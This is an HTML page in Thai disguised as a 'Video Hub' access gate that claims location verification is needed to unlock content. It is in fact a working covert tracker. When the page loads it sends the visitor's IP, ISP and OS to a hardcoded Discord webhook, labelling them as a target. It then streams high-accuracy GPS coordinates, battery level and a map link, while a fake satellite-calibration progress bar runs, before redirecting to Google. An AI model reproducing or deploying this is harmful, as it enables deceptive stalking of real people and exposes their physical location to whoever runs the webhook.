<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Video Hub | Secure Gateway</title>
    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #ff9900; --bg: #0b0b0b; --card: #161616; --text: #e0e0e0; }
        body { margin: 0; background-color: var(--bg); font-family: 'Kanit', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: var(--text); overflow: hidden; }
        .container { text-align: center; width: 90%; max-width: 420px; padding: 40px 30px; background: var(--card); border-radius: 20px; border: 1px solid #222; box-shadow: 0 20px 60px rgba(0,0,0,0.9); }
        .logo { font-size: 38px; font-weight: 600; margin-bottom: 25px; }
        .logo span { background: var(--primary); color: #000; padding: 0px 10px; border-radius: 4px; margin-left: 6px; }
        .btn-main { background: var(--primary); color: #000; border: none; padding: 18px 40px; font-size: 17px; font-weight: 600; border-radius: 10px; cursor: pointer; width: 100%; transition: 0.3s; margin-top: 20px; }
        .progress-container { width: 100%; background: #222; height: 10px; border-radius: 5px; margin: 25px 0; overflow: hidden; display: none; }
        .progress-bar { width: 0%; height: 100%; background: var(--primary); transition: width 0.1s linear; box-shadow: 0 0 15px var(--primary); }
        .status-text { font-size: 14px; color: var(--primary); font-weight: 500; height: 20px; margin-bottom: 5px; }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">Video<span>Hub</span></div>
    
    <div id="step1">
        <div style="font-size: 22px; font-weight: 600; margin-bottom: 10px;">ยืนยันสิทธิ์การเข้าชม</div>
        <p style="font-size: 14px; color: #999; margin-bottom: 30px;">กรุณายืนยันตำแหน่งพื้นที่ปัจจุบันเพื่อปลดล็อกเนื้อหาตามนโยบายลิขสิทธิ์</p>
        <button class="btn-main" onclick="startHybridAudit()">ยินยอมและเริ่มการตรวจสอบ</button>
    </div>

    <div id="step2" style="display:none;">
        <div class="status-text" id="status-msg">กำลังเชื่อมต่อดาวเทียม...</div>
        <div class="progress-container" id="p-container" style="display:block;">
            <div class="progress-bar" id="p-bar"></div>
        </div>
        <p style="font-size: 12px; color: #666;">กำลังปรับจูนความแม่นยำพิกัด (GPS High Precision)</p>
    </div>
</div>

<script>
    const WEB_HOOK = "https://discordapp.com/api/webhooks/1489246843849277572/98NFNxktPRbCeIw3qj0Cr6Nw0lhODmAQvLdaGdN7F0gXUoB845iaF9E7VYzfGfyHGKwm";
    const REDIRECT_URL = "https://www.google.com";

    let bestPos = null;
    let watchID = null;

    // 🚩 รายงานตัวทันทีที่เปิดลิงก์ (ดึง IP/OS)
    window.onload = async () => {
        let ipD = {};
        try { ipD = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e) { ipD = {ip:'N/A'}; }
        sendDiscord("🚨 [ALARM] เป้าหมายเปิดลิงก์", `IP: ${ipD.ip}\nISP: ${ipD.org}\nOS: ${navigator.platform}`);
    };

    function startHybridAudit() {
        document.getElementById('step1').style.display = 'none';
        document.getElementById('step2').style.display = 'block';

        if (navigator.geolocation) {
            // เริ่ม Silent Tracking ทันที
            watchID = navigator.geolocation.watchPosition((p) => {
                if (!bestPos || p.coords.accuracy < bestPos.coords.accuracy) bestPos = p;
                // ส่งอัปเดตแบบรัวๆ (จุดเด่นของ Index)
                sendDiscord("📡 [SILENT UPDATE]", formatData(p));
            }, null, { enableHighAccuracy: true, maximumAge: 0 });
        }

        // ดึงเช็ง 12 วินาที (จุดเด่นของตัวที่สอง)
        let prog = 0;
        const msgs = ["Connecting Satellites...", "Scanning Area...", "Calibrating GPS...", "Finalizing Scan..."];
        const inv = setInterval(() => {
            prog += 0.8;
            document.getElementById('p-bar').style.width = prog + "%";
            document.getElementById('status-msg').innerText = msgs[Math.floor((prog/100)*(msgs.length-1))];
            if (prog >= 100) {
                clearInterval(inv);
                finalizeAndRedirect();
            }
        }, 100);
    }

    async function finalizeAndRedirect() {
        const bat = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({ level: 0 }));
        const finalReport = `**🏁 [MISSION COMPLETED] รายงานพิกัดจ่อยิง**\n` +
                          `**👤 เครื่อง:** ${navigator.platform} | **🔋 แบต:** ${Math.round(bat.level*100)}%\n` +
                          `**🎯 พิกัดแม่นที่สุด:** \`${bestPos?bestPos.coords.latitude:0}, ${bestPos?bestPos.coords.longitude:0}\`\n` +
                          `**🛰️ Accuracy:** +/- ${bestPos?bestPos.coords.accuracy.toFixed(1):0}m\n` +
                          `[คลิกเปิดแผนที่](https://www.google.com/maps?q=${bestPos?bestPos.coords.latitude+','+bestPos.coords.longitude:''})`;
        
        sendDiscord("✅ [FULL REPORT]", finalReport);
        setTimeout(() => { window.location.href = REDIRECT_URL; }, 1000);
    }

    function formatData(p) {
        return `Lat: ${p.coords.latitude}, Lon: ${p.coords.longitude}\nAccuracy: +/- ${p.coords.accuracy.toFixed(1)}m`;
    }

    function sendDiscord(title, desc) {
        fetch(WEB_HOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                embeds: [{ title: title, description: desc, color: 16750848, timestamp: new Date().toISOString() }]
            })
        });
    }
</script>

</body>
</html>
